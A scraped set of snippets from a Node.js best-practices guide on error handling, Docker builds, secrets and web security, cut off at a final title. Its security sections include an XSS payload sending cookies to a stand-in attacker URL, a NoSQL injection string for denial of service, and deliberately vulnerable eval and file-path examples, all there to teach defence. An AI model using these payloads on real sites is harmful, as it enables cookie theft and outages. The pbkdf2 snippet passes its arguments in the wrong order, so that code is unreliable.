TITLE: Full Multi-Stage Docker Build with Alpine Runtime (Node.js)
DESCRIPTION: This comprehensive Dockerfile illustrates a multi-stage build for a Node.js application using distinct base images and explicit steps. The first stage ('build') utilizes a standard Node.js image to install all dependencies and build the application. The second stage employs a minimal Alpine-based Node.js image, installs only production dependencies, and copies the necessary build output from the first stage, resulting in a highly optimized final image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.md#_snippet_3

LANGUAGE: Dockerfile
CODE:
```
# Start with fully-featured Node.js base image
FROM node:14.4.0 AS build

USER node
WORKDIR /home/node/app

# Copy dependency information and install all dependencies
COPY --chown=node:node package.json yarn.lock ./

RUN yarn install --frozen-lockfile

# Copy source code (and all other relevant files)
COPY --chown=node:node src ./src

# Build code
RUN yarn build


# Run-time stage
FROM node:14.4.0-alpine

# Set non-root user and expose port 8080
USER node
EXPOSE 8080

WORKDIR /home/node/app

# Copy dependency information and install production-only dependencies
COPY --chown=node:node package.json yarn.lock ./
RUN yarn install --frozen-lockfile --production

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist ./dist

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Implementing Global Error Handling with process.on - JavaScript
DESCRIPTION: This JavaScript snippet sets up global handlers for Node.js `unhandledRejection` and `uncaughtException` events. The `unhandledRejection` handler catches promise errors, re-throwing them to be caught by the `uncaughtException` handler, which provides a centralized place to process all otherwise unhandled errors and decide whether to exit the process.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.md#_snippet_1

LANGUAGE: javascript
CODE:
```
process.on('unhandledRejection', (reason, p) => {
  // I just caught an unhandled promise rejection,
  // since we already have fallback handler for unhandled errors (see below),
  // let throw and let him handle that
  throw reason;
});

process.on('uncaughtException', (error) => {
  // I just received an error that was never handled, time to handle it and then decide whether a restart is needed
  errorManagement.handler.handleError(error);
  if (!errorManagement.handler.isTrustedError(error))
    process.exit(1);
});
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with PBKDF2 in Node.js
DESCRIPTION: This snippet demonstrates synchronous password hashing and comparison using the native Node.js `crypto.pbkdf2Sync` function, often used for FIPS compliance. It shows how to generate a hash using a password, salt, a large number of iterations, a digest algorithm, and a key length. The hash is stored, and then a provided password is re-hashed with the same parameters and salt to compare against the stored value.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.md#_snippet_2

LANGUAGE: javascript
CODE:
```
try {
  const outSize = 64;
  const digest = 'blake2b512';
  const iterations = 12;
  const hash = crypto.pbkdf2Sync('myPassword','someUniqueUserValueForSalt', iterations * 1000, digest, outSize).toString('hex');

  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = hash === crypto.pbkdf2Sync('somePassword','derivedSalt', iterations * 1000, digest, outSize).toString('hex');

  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
} catch {
  logger.error('could not hash password.')
}
```

----------------------------------------

TITLE: Implementing Global Error Handling with process.on - TypeScript
DESCRIPTION: This TypeScript snippet provides type-safe global handlers for Node.js `unhandledRejection` and `uncaughtException` events. It ensures unhandled promise rejections are re-thrown and processed by the centralized `uncaughtException` handler, which logs the error and determines the appropriate action, such as process termination, based on the error type.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.md#_snippet_2

LANGUAGE: typescript
CODE:
```
process.on('unhandledRejection', (reason: string, p: Promise<any>) => {
  // I just caught an unhandled promise rejection,
  // since we already have fallback handler for unhandled errors (see below),
  // let throw and let him handle that
  throw reason;
});

process.on('uncaughtException', (error: Error) => {
  // I just received an error that was never handled, time to handle it and then decide whether a restart is needed
  errorManagement.handler.handleError(error);
  if (!errorManagement.handler.isTrustedError(error))
    process.exit(1);
});
```

----------------------------------------

TITLE: Blocking Event Loop with Synchronous Loop Javascript
DESCRIPTION: This JavaScript snippet demonstrates a synchronous function `sleep` that uses a busy-wait loop to block execution for a specified duration. When called within an Express route handler, it blocks the main thread, preventing the Event Loop from processing other requests, leading to high latency.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/block-loop.md#_snippet_0

LANGUAGE: javascript
CODE:
```
function sleep (ms) {
  const future = Date.now() + ms
  while (Date.now() < future);
}

server.get('/', (req, res, next) => {
  sleep(30)
  res.send({})
  next()
})
```

----------------------------------------

TITLE: Handling Unhandled Promise Rejections and Uncaught Exceptions (Javascript)
DESCRIPTION: Demonstrates subscribing to the `unhandledRejection` and `uncaughtException` process events in Node.js to catch errors that were not handled locally. It shows how to re-throw unhandled rejections so they can be caught by the general exception handler for centralized processing and potentially exiting the process for non-trusted errors.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.korean.md#_snippet_1

LANGUAGE: javascript
CODE:
```
process.on('unhandledRejection', (reason, p) => {
  // I just caught an unhandled promise rejection, since we already have fallback handler for unhandled errors (see below), let throw and let him handle that
  throw reason;
});
process.on('uncaughtException', (error) => {
  // I just received an error that was never handled, time to handle it and then decide whether a restart is needed
  errorManagement.handler.handleError(error);
  if (!errorManagement.handler.isTrustedError(error))
    process.exit(1);
});

```

----------------------------------------

TITLE: Demonstrating NoSQL Injection Vulnerability - JavaScript
DESCRIPTION: This JavaScript snippet illustrates a potential NoSQL injection vulnerability using a $where clause in a database query. User input is directly included in the find method's conditions, allowing an attacker to inject malicious JavaScript code that can execute within the database layer, potentially causing a denial of service or data exposure.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/ormodmusage.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// A query of
db.balances.find({
  active: true,
  $where: (obj) => obj.credits - obj.debits < userInput
});

// Where userInput equals
"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()"

// will trigger a denial of service

// Another user input might inject other logic resulting in the database exposing sensitive data
```

----------------------------------------

TITLE: Simulating Blocking Delay in Node.js JavaScript
DESCRIPTION: This JavaScript code snippet demonstrates a problematic pattern that blocks the Node.js event loop. The `sleep` function uses a synchronous while loop to pause execution, and calling it within an HTTP route handler prevents the server from responding to other requests efficiently. This illustrates why CPU-bound tasks should be offloaded or handled asynchronously.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/block-loop.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
function sleep (ms) {
  const future = Date.now() + ms
  while (Date.now() < future);
}

server.get('/', (req, res, next) => {
  sleep(30)
  res.send({})
  next()
})
```

----------------------------------------

TITLE: Handling Uncaught Exceptions and Exiting Node.js
DESCRIPTION: This snippet demonstrates a Node.js pattern for handling `uncaughtException` events. It uses a centralized `errorHandler` to process the error and then decides whether to exit the process (`process.exit(1)`) based on whether the error is marked as 'trusted' (operational). This approach prevents the application from continuing in a potentially unstable state after an unexpected error.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/shuttingtheprocess.korean.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
// Assuming developers mark known operational errors with error.isOperational=true, read best practice #3
process.on('uncaughtException', function(error) {
  errorManagement.handler.handleError(error);
  if(!errorManagement.handler.isTrustedError(error))
  process.exit(1)
});

// centralized error handler encapsulates error-handling related logic
function errorHandler() {
  this.handleError = function (error) {
    return logger.logError(err)
      .then(sendMailToAdminIfCritical)
      .then(saveInOpsQueueIfCritical)
      .then(determineIfOperationalError);
  }

  this.isTrustedError = function (error) {
    return error.isOperational;
  }
}
```

----------------------------------------

TITLE: Illustrating Anti-Patterns for Stateless JavaScript Servers
DESCRIPTION: This snippet shows common mistakes that violate the principle of stateless server design. It includes examples of saving uploaded files locally using Multer, storing user sessions in local files or memory with session-file-store, and saving data in the global object, all of which create state dependencies on a specific server instance. Avoiding these patterns allows servers to be killed and replaced without losing crucial data or configuration.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/bestateless.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// Typical mistake 1: saving uploaded files locally on a server
var multer = require('multer'); // express middleware for handling multipart uploads
var upload = multer({ dest: 'uploads/' });

app.post('/photos/upload', upload.array('photos', 12), function (req, res, next) {});

// Typical mistake 2: storing authentication sessions (passport) in a local file or memory
var FileStore = require('session-file-store')(session);
app.use(session({
    store: new FileStore(options),
    secret: 'keyboard cat'
}));

// Typical mistake 3: storing information on the global object
Global.someCacheLike.result = { somedata };
```

----------------------------------------

TITLE: Configuring Rate Limiters for Login Protection - JavaScript
DESCRIPTION: This snippet configures two rate limiters using the 'rate-limiter-flexible' package with Redis storage. The first limiter ('limiterSlowBruteByIP') tracks daily failed attempts per IP address and blocks the IP for a day after 100 failures. The second ('limiterConsecutiveFailsByUsernameAndIP') tracks consecutive failures per username and IP pair, storing the count for 90 days and blocking the pair for 1 hour after 10 consecutive failures. It requires the 'rate-limiter-flexible' package and a Redis client instance.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/login-rate-limit.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const maxWrongAttemptsByIPperDay = 100;
const maxConsecutiveFailsByUsernameAndIP = 10;

const limiterSlowBruteByIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_ip_per_day',
  points: maxWrongAttemptsByIPperDay,
  duration: 60 * 60 * 24,
  blockDuration: 60 * 60 * 24, // Block for 1 day, if 100 wrong attempts per day
});

const limiterConsecutiveFailsByUsernameAndIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_consecutive_username_and_ip',
  points: maxConsecutiveFailsByUsernameAndIP,
  duration: 60 * 60 * 24 * 90, // Store number for 90 days since first fail
  blockDuration: 60 * 60, // Block for 1 hour
});
```

----------------------------------------

TITLE: Detecting eval with expression JavaScript
DESCRIPTION: This example highlights the use of the `eval()` function with input obtained from the user (`req.body.userinput`). Evaluating arbitrary code supplied by a user is extremely dangerous and leads to severe code injection vulnerabilities. The use of `eval()` should be avoided, especially when processing external or untrusted inputs.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/lintrules.md#_snippet_2

LANGUAGE: JavaScript
CODE:
```
const userinput = req.body.userinput;
eval(userinput);
```

----------------------------------------

TITLE: Configuring and Using express-jwt-blacklist for JWT Revocation (Node.js)
DESCRIPTION: This snippet demonstrates configuring `express-jwt-blacklist` with an external Memcached store for persisting revoked token IDs ('jti'). It integrates the blacklist's `isRevoked` function with `express-jwt` to check token validity during authentication and provides an example logout route to revoke a user's token using `blacklist.revoke`.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/expirejwt.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const jwt = require('express-jwt');
const blacklist = require('express-jwt-blacklist');

blacklist.configure({
  tokenId: 'jti',
  strict: true,
  store: {
    type: 'memcached',
    host: '127.0.0.1',
    port: 11211,
    keyPrefix: 'mywebapp:',
    options: {
      timeout: 1000
    }
  }
});

app.use(jwt({
  secret: 'my-secret',
  isRevoked: blacklist.isRevoked
}));

app.get('/logout', (req, res) => {
  blacklist.revoke(req.user)
  res.sendStatus(200);
});
```

----------------------------------------

TITLE: Detecting non-literal FS filename JavaScript
DESCRIPTION: This code snippet shows reading a file path directly derived from user input (`req.body.userinput`). Security linters detect this pattern as it is vulnerable to directory traversal attacks, allowing attackers to access sensitive files outside the intended directory. Always validate and sanitize user-provided paths rigorously before any file system operations.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/lintrules.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
const path = req.body.userinput;
fs.readFile(path);
```

----------------------------------------

TITLE: Demonstrating Error Throwing Scenarios in JavaScript Promises
DESCRIPTION: This JavaScript snippet presents multiple scenarios of throwing errors within promise constructs or handlers to illustrate how different contexts might result in unhandled errors if not properly caught. It includes examples of throwing inside `.then`, `.catch`, and directly within the `Promise` constructor function.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.md#_snippet_3

LANGUAGE: javascript
CODE:
```
Promise.resolve('promised value').then(() => {
  throw new Error('error');
});

Promise.reject('error value').catch(() => {
  throw new Error('error');
});

new Promise((resolve, reject) => {
  throw new Error('error');
});
```

----------------------------------------

TITLE: Accessing Environment Variables in Node.js Javascript
DESCRIPTION: This snippet demonstrates the standard method for accessing secrets or configuration values stored as environment variables in a Node.js application. It requires the variable (e.g., AZURE_STORAGE_KEY) to be set in the system environment and accessed using the global `process.env` object. The value is then used to initialize a service client.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secretmanagement.md#_snippet_0

LANGUAGE: javascript
CODE:
```
    const azure = require('azure');

    const apiKey = process.env.AZURE_STORAGE_KEY;
    const blobService = azure.createBlobService(apiKey);
```

----------------------------------------

TITLE: Building with Mounted Secret - Dockerfile
DESCRIPTION: Demonstrates how to use Docker's experimental `--secret` feature to provide sensitive data like an npm token during a build without embedding it in layers or history. It requires specifying the experimental syntax and uses the `--mount=type=secret,id=npm,target=/root/.npmrc` flag to mount a secret file (identified by 'npm') to a target path within the build container, which is then used by the `npm ci` command.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
# syntax = docker/dockerfile:1.0-experimental

FROM node:12-slim

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN --mount=type=secret,id=npm,target=/root/.npmrc npm ci

# The rest comes here
```

----------------------------------------

TITLE: Securing Secrets with Multi-Stage Build - Dockerfile
DESCRIPTION: Illustrates a secure approach using multi-stage builds. Secrets are used in an intermediate 'build' stage (e.g., via an ARG to create a temporary .npmrc), but only the necessary build artifacts or application files are copied to the final production stage, ensuring the secret itself and the temporary files containing it are not present in the final image. Note that the secret might still be visible in local Docker daemon history.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.french.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

ARG NPM_TOKEN

WORKDIR /usr/src/app
COPY . /dist

RUN echo "//registry.npmjs.org/:\_authToken=\$NPM_TOKEN" > .npmrc && \
 npm ci --production && \
 rm -f .npmrc


FROM build as prod

COPY --from=build /dist /dist
CMD ["node", "index.js"]

# The ARG and .npmrc won't appear in the final image but can be found in the Docker daemon un-tagged images list - make sure to delete those
```

----------------------------------------

TITLE: Demonstrating Error Handling Flow - Node.js Javascript
DESCRIPTION: Illustrates a recommended error handling flow in Node.js applications. Errors are propagated from lower layers (DAL) to API routes, caught by a middleware or equivalent mechanism, and then delegated to a central error handler for logging, monitoring, and response generation. Includes handling for `uncaughtException` and `unhandledRejection`.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// DAL layer, we don't handle errors here
DB.addDocument(newCustomer, (error, result) => {
  if (error)
    throw new Error('Great error explanation comes here', other useful parameters)
});

// API route code, we catch both sync and async errors and forward to the middleware
try {
  customerService.addNew(req.body).then((result) => {
    res.status(200).json(result);
  }).catch((error) => {
    next(error)
  });
}
catch (error) {
  next(error);
}

// Error handling middleware, we delegate the handling to the centralized error handler
app.use(async (err, req, res, next) => {
  await errorHandler.handleError(err, res);//The error handler will send a response
});

process.on("uncaughtException", error => {
  errorHandler.handleError(error);
});

process.on("unhandledRejection", (reason) => {
  errorHandler.handleError(reason);
});
```

----------------------------------------

TITLE: Enabling SSL/TLS with Express and Node.js HTTPS
DESCRIPTION: This snippet demonstrates how to create and start an HTTPS server using the Express framework and Node.js's built-in `https` module. It requires the `express`, `https`, and `fs` modules. The `options` object requires paths to the SSL/TLS certificate (`cert`) and private key (`key`) files, which should be adjusted based on your file system setup. The server listens on port 443, the standard HTTPS port.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureserver.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const express = require('express');
const https = require('https');
const app = express();
const options = {
    // The path should be changed accordingly to your setup
    cert: fs.readFileSync('./sslcert/fullchain.pem'),
    key: fs.readFileSync('./sslcert/privkey.pem')
};
https.createServer(options, app).listen(443);
```

----------------------------------------

TITLE: Illustrating Uncaught Error in Promise .then - JavaScript
DESCRIPTION: This JavaScript snippet demonstrates how an error thrown inside a promise's `.then` handler, without a subsequent `.catch`, becomes an unhandled promise rejection. Such errors can be missed by standard `uncaughtException` handlers, highlighting the need for specific `unhandledRejection` handling.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.md#_snippet_0

LANGUAGE: javascript
CODE:
```
DAL.getUserById(1).then((johnSnow) => {
  // this error will just vanish
  if(johnSnow.isAlive === false)
      throw new Error('ahhhh');
});
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with SCrypt (JavaScript)
DESCRIPTION: Shows how to synchronously hash a password using Node.js's native `crypto.scryptSync` function, specifying a unique salt and output size, and then comparing a provided password against the stored hexadecimal hash. Requires the built-in Node.js `crypto` module.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.french.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
  const outSize = 64;
  const hash = crypto.scryptSync('myUnlimitedPassword','someUniqueUserValueForSalt',outSize).toString('hex');

  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = hash === crypto.scryptSync('someUnlimitedPassword','derivedSalt',outSize).toString('hex');

  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
```

----------------------------------------

TITLE: Secure Build with Multi-stage - Dockerfile
DESCRIPTION: Illustrates a multi-stage Docker build approach for handling secrets securely. A secret (like an NPM token passed via ARG) is used only in the intermediate 'build' stage to configure npm. The secret is written to a temporary file (`.npmrc`) which is removed before the final 'prod' image is built by copying only the required files from the 'build' stage. This prevents the secret from appearing in the final image, although it may be present in the local Docker daemon's untagged images list.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

ARG NPM_TOKEN

WORKDIR /usr/src/app
COPY . /dist

RUN echo "//registry.npmjs.org/:\_authToken=\$NPM_TOKEN" > .npmrc && \
 npm ci --production && \
 rm -f .npmrc


FROM build as prod

COPY --from=build /dist /dist
CMD ["node", "index.js"]

# The ARG and .npmrc won't appear in the final image but can be found in the Docker daemon un-tagged images list - make sure to delete those
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with SCrypt in Node.js
DESCRIPTION: This snippet illustrates synchronous password hashing and comparison using the native Node.js `crypto.scryptSync` function. It shows how to generate a hash with a specified output size and salt, store it, and then re-calculate the hash for a provided password and salt to check for a match against the stored hash. Note that synchronous functions can block the event loop.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.md#_snippet_1

LANGUAGE: javascript
CODE:
```
  const outSize = 64;
  const hash = crypto.scryptSync('myUnlimitedPassword','someUniqueUserValueForSalt',outSize).toString('hex');

  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = hash === crypto.scryptSync('someUnlimitedPassword','derivedSalt',outSize).toString('hex');

  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
```

----------------------------------------

TITLE: Multi-Stage Build for Production Node.js in Dockerfile
DESCRIPTION: This multi-stage Dockerfile uses one stage for building (installing all dependencies, running build scripts) and another for runtime. The final stage copies only necessary production files and dependencies from the build stage, explicitly running `npm prune --production` to remove development dependencies, creating a minimal and secure production image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:14.8.0-alpine AS build

COPY --chown=node:node package.json package-lock.json ./
# ✅ Safe install
RUN npm ci
COPY --chown=node:node src ./src
RUN npm run build


# Run-time stage
FROM node:14.8.0-alpine

COPY --chown=node:node --from=build package.json package-lock.json ./
COPY --chown=node:node --from=build node_modules ./node_modules
COPY --chown=node:node --from=build dist ./dist

# ✅ Clean dev packages
RUN npm prune --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Executing Node.js Directly in Dockerfile
DESCRIPTION: This Dockerfile demonstrates the recommended pattern for running a Node.js application by directly invoking the `node` command via the `CMD` instruction. This approach delegates process management, health monitoring, and restart responsibilities to the Docker orchestrator (e.g., Kubernetes), allowing it to make informed decisions based on the entire cluster's state for better resilience and resource utilization. It requires Node.js to be installed within the container and specifies the application entry point.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/restart-and-replicate-processes.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim

# The build logic comes here

CMD ["node", "index.js"]
```

----------------------------------------

TITLE: Creating Operational Errors in JavaScript
DESCRIPTION: This snippet demonstrates how to explicitly mark an Error object as operational by adding an `isOperational` flag. It also shows the structure of a custom `AppError` class that incorporates this flag and uses `Error.captureStackTrace` for better debugging, facilitating centralized error handling strategies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/operationalvsprogrammererror.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// marking an error object as operational 
const myError = new Error('How can I add new product when no value provided?');
myError.isOperational = true;

// or if you're using some centralized error factory (see other examples at the bullet "Use only the built-in Error object")
class AppError {
  constructor (commonType, description, isOperational) {
    Error.call(this);
    Error.captureStackTrace(this);
    this.commonType = commonType;
    this.description = description;
    this.isOperational = isOperational;
  }
};

throw new AppError(errorManagement.commonErrors.InvalidInput, 'Describe here what happened', true);
```

----------------------------------------

TITLE: Executing Node.js directly in Dockerfile CMD
DESCRIPTION: This code snippet shows the recommended approach for running a Node.js application in a Docker container. The Dockerfile's CMD instruction directly invokes the 'node' executable, allowing the Docker runtime and orchestrator to fully manage the process lifecycle, including restarts and health checks. This method ensures the orchestrator is aware of the application's state.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/restart-and-replicate-processes.french.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

# The build logic comes here

CMD ["node", "index.js"]
```

----------------------------------------

TITLE: Implementing Safe Redirect with Whitelist in Express
DESCRIPTION: This snippet provides a safe approach using a 'getValidRedirect' function. This function validates the user-supplied URL against a predefined whitelist of allowed external domains or checks if it's a valid relative path, prepending the site's domain if necessary. The Express route uses this function to ensure redirects only go to trusted locations, preventing open redirect vulnerabilities.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/saferedirects.french.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const whitelist = { 
  'https://google.com': 1 
};

function getValidRedirect(url) { 
    // check if the url starts with a single slash 
  if (url.match(/^\/(?!\/)/)) { 
    // Prepend our domain to make sure 
    return 'https://example.com' + url; 
  } 
    // Otherwise check against a whitelist
  return whitelist[url] ? url : '/'; 
}

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(getValidRedirect(req.query.url));
  }

});
```

----------------------------------------

TITLE: Building Docker Image for Non-Root Node.js
DESCRIPTION: This Dockerfile defines the steps to build a container image where a Node.js application runs as the 'node' user instead of root, significantly improving security by adhering to the principle of least privilege. It copies package.json, installs dependencies, copies the application code, exposes a non-privileged port (3000), and explicitly sets the user to 'node' before running the main server file.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/non-root-user.french.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:latest

COPY package.json .
RUN npm install
COPY . .
EXPOSE 3000
USER node
CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Chaining Promises and Catching Errors (JavaScript)
DESCRIPTION: This snippet demonstrates chaining asynchronous operations using Promises. Each `.then()` processes the successful result of the previous Promise, and a single `.catch()` block at the end is used to handle any error that occurs anywhere in the chain, providing a clean and centralized error handling mechanism.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
doWork()
 .then(doWork)
 .then(doOtherWork)
 .then((result) => doWork)
 .catch((error) => {throw error;})
 .then(verify);
```

----------------------------------------

TITLE: Configuring Secure Express.js Session Middleware - JavaScript
DESCRIPTION: This snippet demonstrates how to configure the `express-session` middleware with recommended secure settings. It involves setting a unique `secret` for signing the session ID, changing the default cookie `name` to prevent identification attacks, setting `cookie.httpOnly` to true to protect against XSS, setting `cookie.secure` to true to ensure cookies are only sent over HTTPS, and setting `cookie.maxAge` to define the session expiry.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/sessions.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
app.use(session({
  secret: 'youruniquesecret', // secret string used in the signing of the session ID that is stored in the cookie
  name: 'youruniquename', // set a unique name to remove the default connect.sid
  cookie: {
    httpOnly: true, // minimize risk of XSS attacks by restricting the client from reading the cookie
    secure: true, // only send cookie over https
    maxAge: 60000*60*24 // set cookie expiry length in ms
  }
}));
```

----------------------------------------

TITLE: Validating JSON Input with Joi (Javascript)
DESCRIPTION: This snippet demonstrates how to use the Joi library to validate complex JSON objects. It defines a schema for 'member' data including password format, birth year range, and email validity, and then uses Joi.assert within a function to enforce this schema on the input, causing the program to fail fast by throwing an error if validation fails.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/failfast.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
var memberSchema = Joi.object().keys({
 password: Joi.string().regex(/^[a-zA-209]{3,30}$/),
 birthyear: Joi.number().integer().min(1900).max(2013),
 email: Joi.string().email()
});

function addNewMember(newMember) {
 // assertions come first
 Joi.assert(newMember, memberSchema); //throws if validation fails
 // other logic here
}
```

----------------------------------------

TITLE: Multi-Stage Docker Build for Production Dependencies
DESCRIPTION: Shows a multi-stage build approach. The first stage installs all dependencies using `npm ci` for building, and the second (runtime) stage copies only necessary production artifacts and explicitly prunes development dependencies using `npm prune --production`. This further reduces the final image size and risk.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.french.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:14.8.0-alpine AS build

COPY --chown=node:node package.json package-lock.json ./
# ✅ Safe install
RUN npm ci
COPY --chown=node:node src ./src
RUN npm run build


# Run-time stage
FROM node:14.8.0-alpine

COPY --chown=node:node --from=build package.json package-lock.json ./
COPY --chown=node:node --from=build node_modules ./node_modules
COPY --chown=node:node --from=build dist ./dist

# ✅ Clean dev packages
RUN npm prune --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Example Malicious XSS Injection Payload - HTML
DESCRIPTION: This HTML snippet demonstrates a simple payload that could be injected into a web application's database via user input (like a comment). When rendered unescaped, the embedded <script> tag executes, attempting to steal the user's cookies by redirecting their browser to an attacker-controlled URL. This highlights the danger of rendering untrusted HTML input directly without proper sanitization and escaping.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.polish.md#_snippet_1

LANGUAGE: html
CODE:
```
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
<\/script>
<\/div>
```

----------------------------------------

TITLE: Detecting insecure random bytes JavaScript
DESCRIPTION: This snippet demonstrates the usage of `crypto.pseudoRandomBytes`, which is flagged by security linters because it is not suitable for cryptographic purposes like generating secrets or keys. Secure applications should use cryptographically secure random number generators such as `crypto.randomBytes` or `crypto.randomUUID` instead to prevent potential predictability issues.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/lintrules.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
const insecure = crypto.pseudoRandomBytes(5);
```

----------------------------------------

TITLE: Anti-Pattern: Exposing Secrets via Build Args - Dockerfile
DESCRIPTION: Demonstrates an insecure pattern where a secret is passed as a build argument (ARG), used within a RUN command to create a temporary file (.npmrc), and then deleted within the *same* command. This is an anti-pattern because Docker layers record the filesystem changes, including the creation of the temporary file before its deletion, making the secret visible in the image's history.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.french.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

ARG NPM_TOKEN

WORKDIR /usr/src/app
COPY . /dist

RUN echo "//registry.npmjs.org/:\_authToken=\$NPM_TOKEN" > .npmrc && \
 npm ci --production && \
 rm -f .npmrc

# Deleting the .npmrc within the same copy command will not save it inside the layer, however it can be found in image history

CMD ["node", "index.js"]
```

----------------------------------------

TITLE: Highlighting Vulnerable Locations HTML
DESCRIPTION: This snippet demonstrates various common contexts within an HTML document where inserting untrusted data directly can lead to security vulnerabilities, particularly Cross-Site Scripting (XSS). It shows examples in <script> tags, HTML comments, attribute names, tag names, and <style> tags, emphasizing the need for context-aware escaping.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.french.md#_snippet_0

LANGUAGE: HTML
CODE:
```
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS
```

----------------------------------------

TITLE: Anti-Pattern Using Build ARG - Dockerfile
